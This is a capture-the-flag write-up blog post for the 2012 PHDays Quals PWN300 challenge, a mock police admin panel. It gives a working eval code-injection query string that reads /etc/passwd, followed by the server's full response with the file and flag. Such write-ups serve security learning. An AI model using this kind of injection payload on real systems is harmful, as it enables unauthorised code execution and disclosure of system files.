---
layout: post
title: "2012 PHDays Quals: PWN300 Writeup"
description: ""
category: security
tags: [phdays, phdays quals, ctf]
---

*This post is mirrored from my old blog.*

We were presented with a simple site. It was the admin control panel for the oppressive South Park PD. It allowed the cruel police of South Park to select a citizen, and one of three horrible actions. To teach them a lesson, we were to extract the flag from /etc/passwd.

Submitting the form submitted three parameters:  
actions  
choice  
human

We were given the sources, but I didn't look too hard at them. Chucking rubbish into the variables, we're very quickly able to get a python stack trace. With some more tinkering, we can find that whatever is included in "human" is passed to "actions" as an argument. The output of actions has to be a string, or the program fails.

The query I used to get the flag was:

	&actions=eval&choice=%00&human=str(file("/etc/passwd").read())

I never figured out what choice did, but changing it from a null byte seemed to break things, so I just left it.

The response:

	HTTP/1.1 200 OK
	Date: Sat, 15 Dec 2012 16:07:58 GMT
	Content-Length: 1485
	Content-Type: text/html
	Server: TwistedWeb/12.1.0
	
	# $FreeBSD: src/etc/master.passwd,v 1.42.2.1.2.2 2012/11/17 08:36:10 svnexp Exp $
	#
	root:*:0:0:Charlie &amp; flag -&gt; d9301a72ee12eabb2b913398a3fab50b:/root:/bin/csh
	toor:*:0:0:Bourne-again Superuser:/root:
	daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
	operator:*:2:5:System &amp;:/:/usr/sbin/nologin
	bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
	tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
	kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
	games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
	news:*:8:8:News Subsystem:/:/usr/sbin/nologin
	man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
	sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
	smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
	mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
	bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
	proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
	_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
	_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
	uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
	pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
	www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
	hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
	nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
	phdays:*:1001:1001:User &amp;:/home/phdays:/bin/sh</blockquote>